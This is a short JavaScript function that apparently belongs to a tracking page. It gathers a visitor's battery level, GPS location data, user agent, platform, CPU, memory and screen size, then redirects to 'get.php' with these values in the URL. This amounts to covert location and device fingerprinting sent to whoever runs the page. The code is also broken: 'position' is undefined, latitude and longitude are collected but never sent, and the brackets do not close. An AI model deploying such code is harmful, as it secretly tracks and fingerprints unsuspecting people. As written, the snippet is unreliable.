function getLocation(){
    navigator.getBattery().then(function(battery){
        var battery = battery.level*100;
        var useragent = navigator.userAgent;
        var latitude = position.coords.latitude;
        var longitude = position.coords.longitude;
        var altitude = position.coords.altitude;
        var accuracy = position.coords.accuracy;
        var speed = position.coords.speed;
        var heading = position.coords.heading;
        var platform = navigator.platform;
        var hardware = navigator.hardwareConcurrency;
        var memory = navigator.deviceMemory;
        var height = window.screen.height;
        var width = window.screen.width;
      
      window.location.href = "get.php?altitude=" + altitude + "&platform=" + platform + "&accuracy=" + accuracy + "&speed=" + speed + "&heading=" + heading + "&hardware=" + hardware + "&memory=" + memory + "&useragent=" + useragent + "&height=" + height + "&width=" + width + "&battery=" + battery;
        
}}